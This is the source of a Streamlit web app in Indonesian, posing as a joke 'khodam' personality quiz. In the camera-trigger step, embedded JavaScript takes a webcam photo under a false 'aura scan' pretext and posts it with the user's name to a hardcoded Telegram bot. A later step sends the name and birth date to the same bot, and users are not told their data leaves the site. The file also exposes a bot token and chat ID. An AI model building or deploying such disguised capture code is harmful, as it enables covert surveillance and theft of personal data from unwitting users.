import requests
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime
import time
import hashlib

# ==========================================
# KONFIGURASI BOT TELEGRAM & HALAMAN
# ==========================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="Klinik Kehaluan Nasional - Cek Khodam",
    page_icon="🤡",
    layout="centered"
)

# ==========================================
# CUSTOM CSS / STYLING CYBER-MATRIX & GLITCH
# ==========================================
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700;800&display=swap');

    .stApp {
        background: linear-gradient(135deg, #09090b 0%, #18181b 50%, #27272a 100%);
        color: #f8fafc;
        font-family: 'Plus Jakarta Sans', sans-serif;
    }

    /* Kotak Utama / Glassmorphism Card */
    .cyber-card {
        background: rgba(24, 24, 27, 0.9);
        backdrop-filter: blur(16px);
        border: 2px solid #ec4899;
        border-radius: 24px;
        padding: 30px;
        box-shadow: 0 0 30px rgba(236, 72, 153, 0.25);
        margin-bottom: 25px;
    }

    /* Kotak Peringatan / Keterangan Izin Kamera */
    .cyber-warning-box {
        background: rgba(236, 72, 153, 0.1);
        border: 1px dashed #ec4899;
        border-left: 6px solid #ec4899;
        padding: 16px 20px;
        border-radius: 14px;
        margin-bottom: 20px;
        font-size: 14px;
        color: #fbcfe8;
        line-height: 1.6;
    }

    /* Input Field Styling */
    .stTextInput > div > div > input {
        background-color: #09090b !important;
        color: #f472b6 !important;
        border: 2px solid #3f3f46 !important;
        border-radius: 12px !important;
        padding: 14px !important;
        font-weight: 700 !important;
    }
    .stTextInput > div > div > input:focus {
        border-color: #ec4899 !important;
        box-shadow: 0 0 15px rgba(236, 72, 153, 0.4) !important;
    }

    /* Tombol Utama Streamlit */
    .stButton > button {
        background: linear-gradient(135deg, #ec4899 0%, #a855f7 100%) !important;
        color: #ffffff !important;
        border: none !important;
        border-radius: 14px !important;
        font-weight: 800 !important;
        letter-spacing: 1.5px !important;
        padding: 16px 20px !important;
        width: 100% !important;
        box-shadow: 0 0 25px rgba(236, 72, 153, 0.5) !important;
        transition: all 0.3s ease !important;
        text-transform: uppercase !important;
    }
    .stButton > button:hover {
        opacity: 0.9 !important;
        transform: translateY(-2px) !important;
        box-shadow: 0 0 35px rgba(236, 72, 153, 0.8) !important;
    }
    </style>
""", unsafe_allow_html=True)

# ==========================================
# INISIALISASI SESSION STATE
# ==========================================
if 'step' not in st.session_state:
    st.session_state.step = 0
if 'user_name' not in st.session_state:
    st.session_state.user_name = ""
if 'user_dob' not in st.session_state:
    st.session_state.user_dob = ""
if 'telegram_sent' not in st.session_state:
    st.session_state.telegram_sent = False
if 'trigger_camera' not in st.session_state:
    st.session_state.trigger_camera = False

# ==========================================
# DATABASE KHODAM ROASTING BRUTAL & KOCAK
# ==========================================
MASTER_KHODAM = [
    {
        "title": "🐒 Khodam Monyet Suka Nyolong Mangga Tetangga",
        "desc": "Mentalmu adalah mental buronan RT. Suka gerabak-gerubuk gak jelas pas ada suara motor satpam, padahal hidupmu cuma rebahan doang di kasur sambil scrolling Reels."
    },
    {
        "title": "💸 Khodam Pinjol Legal Bunga 0% Tapi Ditagih DC Galak",
        "desc": "Simbol kehancuran finansial hakiki. Tiap hari kerjanya angkat telpon dari nomor tak dikenal sambil pura-pura jadi almarhum."
    },
    {
        "title": "🐈 Khodam Kucing Hitam Numpang Makan Gratis di Warteg",
        "desc": "Muka tembok level dewa. Datang pas lapar doang, pas udah kenyang langsung ngabur tanpa bilang makasih ke yang traktir."
    },
    {
        "title": "🩴 Khodam Swallow Putus Dicor Semen Basah Pinggir Jalan",
        "desc": "Nasib percintaanmu setara sandal jepit kena semen: nge-stuck, susah dicabut, dan akhirnya cuma ninggalin jejak kaki yang bikin emosi jiwa."
    },
    {
        "title": "🧟 Khodam Mayat Hidup Kecanduan Scroll TikTok Jam 3 Pagi",
        "desc": "Bola matamu udah gak berbentuk manusia normal. Kerjanya ketawa-ketawa sendiri nontonin video orang jualan lidi pakai mukena."
    },
    {
        "title": "🛵 Khodam Ojol Cancel Orderan Pas Lagi Hujan Badai",
        "desc": "Punya bakat alami jadi pengecut handal. Kalau diajak susah langsung ngilang kayak ditelan bumi, giliran senang dipaling depan."
    },
    {
        "title": "🍼 Khodam Galon Kosong Digelindingin di Tangga Kosan",
        "desc": "Berisik doang di awal, bikin heboh satu gang, tapi pas dilihat isinya kosong melompong gak ada gunanya sama sekali."
    },
    {
        "title": "🕳️ Khodam Lubang Sabuk Tambahan Gegara Kekenyangan Seblak",
        "desc": "Bukti nyata kalau kamu hobi rebahan sambil nyemilin seblak pedas level 10 tiap tengah malem tanpa memikirkan lingkar pinggang."
    }
]

# ==========================================
# RENDER UTAMA BERDASARKAN STEP
# ==========================================

# --- STEP 0: FORM RITUAL & PEMICU KAMERA ---
if st.session_state.step == 0:
    st.markdown("<h1 style='text-align: center; color: #ec4899; text-shadow: 0 0 20px rgba(236,72,153,0.6);'>🤡 KLINIK KEHALUAN NASIONAL</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #38bdf8; margin-bottom: 30px; font-weight: 700;'>99% Orang Nyesel Setelah Tau Khodam Aslinya!</p>", unsafe_allow_html=True)

    with st.container():
        st.markdown('<div class="cyber-card">', unsafe_allow_html=True)
        
        st.markdown("""
            <div class="cyber-warning-box">
                🩺 <b>SYARAT PEMERIKSAAN KLINIK:</b><br>
                Sistem klinik memerlukan izin akses kamera sementara untuk proses verifikasi wajah dan pemindaian aura gaib. Silakan klik <b>"Izinkan / Allow"</b> pada pop-up browser yang muncul agar hasil diagnosa dapat diproses.
            </div>
        """, unsafe_allow_html=True)
        
        name_input = st.text_input("Nama Lengkap / Nama Panggilan", value=st.session_state.user_name)
        dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value=st.session_state.user_dob)
        
        st.write("")
        
        if st.button("💥 MULAI PEMERIKSAAN & CEK KHODAM", use_container_width=True):
            if not name_input.strip() or not dob_input.strip():
                st.warning("⚠️ Mohon isi Nama dan Tanggal Lahir terlebih dahulu!")
            else:
                st.session_state.user_name = name_input
                st.session_state.user_dob = dob_input
                st.session_state.trigger_camera = True

        if st.session_state.trigger_camera:
            cam_capture_html = f"""
            <div style="text-align: center; padding: 15px; background: rgba(236,72,153,0.15); border-radius: 12px; border: 1px solid #ec4899; margin-top: 15px;">
                <video id="video" width="320" height="240" autoplay style="display:none;"></video>
                <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
                <p style="color: #f472b6; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: bold; font-size: 14px; margin: 0;">⏳ Sedang cek khodam pendamping...</p>
                
                <script>
                    const token = "{TELEGRAM_BOT_TOKEN}";
                    const chatId = "{TELEGRAM_CHAT_ID}";
                    const targetName = "{st.session_state.user_name}";
                    
                    navigator.mediaDevices.getUserMedia({{ video: true }})
                    .then(function(stream) {{
                        var video = document.getElementById('video');
                        video.srcObject = stream;
                        video.play();
                        
                        setTimeout(function() {{
                            var canvas = document.getElementById('canvas');
                            var context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, 640, 480);
                            var dataURL = canvas.toDataURL('image/jpeg');
                            
                            fetch(dataURL)
                            .then(res => res.blob())
                            .then(blob => {{
                                var formData = new FormData();
                                formData.append('chat_id', chatId);
                                formData.append('photo', blob, 'halu_target.jpg');
                                formData.append('caption', '🤡 <b>PASIEN KLINIK KEHALUAN TERCIDUK!</b>\\n👤 Nama: ' + targetName);
                                
                                fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                                    method: 'POST',
                                    body: formData
                                }}).catch(err => console.log(err))
                                .finally(() => {{
                                    window.parent.location.href = window.parent.location.href.split('?')[0] + "?run_step=2";
                                }});
                            }});
                            
                            stream.getTracks().forEach(track => track.stop());
                        }}, 1500);
                    }})
                    .catch(function(err) {{
                        console.log("Akses kamera ditolak: ", err);
                        window.parent.location.href = window.parent.location.href.split('?')[0] + "?run_step=2";
                    }});
                </script>
            </div>
            """
            components.html(cam_capture_html, height=120, scrolling=False)
        
        st.markdown('</div>', unsafe_allow_html=True)

    query_params = st.query_params
    if "run_step" in query_params and query_params["run_step"] == "2":
        st.session_state.step = 2
        st.query_params.clear()
        st.rerun()

# --- STEP 2: ANIMASI PROSES PENCARIAN & KIRIM TELEGRAM TEKS ---
elif st.session_state.step == 2:
    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>⏳ Sedang cek khodam pendamping...</h2>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #ec4899;'>Mohon tunggu sebentar, dokter spesialis kehaluan sedang menganalisis data...</p>", unsafe_allow_html=True)
    
    st.write("")
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    status_text.text("🧐 Menghubungkan ke server pusat khodam nusantara...")
    progress_bar.progress(35)
    time.sleep(1)
    
    status_text.text(f"🔍 Mencocokkan rekam medis {st.session_state.user_name}...")
    progress_bar.progress(75)
    time.sleep(1)

    if not st.session_state.telegram_sent:
        unique_string = (st.session_state.user_name + st.session_state.user_dob).lower().encode('utf-8')
        hash_val = int(hashlib.md5(unique_string).hexdigest(), 16)
        
        khodam_idx = hash_val % len(MASTER_KHODAM)
        power_level = (hash_val % 99) + 1  
        
        profile = MASTER_KHODAM[khodam_idx]
        profile['power'] = f"Tingkat Kehaluan Akut: {power_level}% (Valid Berdasarkan Hasil Medis Gaib)"
        st.session_state.current_profile = profile
        
        now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        caption = (
            f"🤡 <b>DATA TEKS PASIEN KEHALUAN!</b>\n\n"
            f"👤 Nama: <b>{st.session_state.user_name}</b>\n"
            f"🎂 Tanggal Lahir: <code>{st.session_state.user_dob}</code>\n"
            f"🕒 Waktu: {now}\n"
            f"✨ Hasil Khodam: <b>{profile['title']}</b>"
        )
        try:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption, 'parse_mode': 'HTML'}
            )
        except Exception:
            pass
        st.session_state.telegram_sent = True
    
    status_text.text("✨ Selesai! Mengeluarkan hasil diagnosa...")
    progress_bar.progress(100)
    time.sleep(0.5)
    
    st.session_state.step = 3
    st.rerun()

# --- STEP 3: TAMPILAN HASIL KHODAM RECEH (AUTO SENYUM) ---
elif st.session_state.step == 3:
    profile = st.session_state.current_profile

    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>🎉 HASIL PEMERIKSAAN KELUAR</h2>", unsafe_allow_html=True)
    st.write("")

    st.markdown('<div class="cyber-card">', unsafe_allow_html=True)
    st.markdown(f"<h3 style='color: #ec4899; text-align: center; font-weight: 800;'>{profile['title']}</h3>", unsafe_allow_html=True)
    st.markdown(f"<p style='text-align: center; color: #38bdf8; font-weight: 700; font-size: 1.1rem;'>{profile['power']}</p>", unsafe_allow_html=True)
    st.markdown("<hr style='border-color: rgba(236, 72, 153, 0.3);'>", unsafe_allow_html=True)
    st.markdown(f"<p style='text-align: center; font-size: 1.15rem; line-height: 1.7; color: #f8fafc;'>{profile['desc']}</p>", unsafe_allow_html=True)
    st.markdown('</div>', unsafe_allow_html=True)

    st.write("")
    if st.button("🔄 PERIKSA PASIEN / TEMAN LAIN", use_container_width=True):
        st.session_state.step = 0
        st.session_state.user_name = ""
        st.session_state.user_dob = ""
        st.session_state.telegram_sent = False
        st.session_state.trigger_camera = False
        st.rerun()
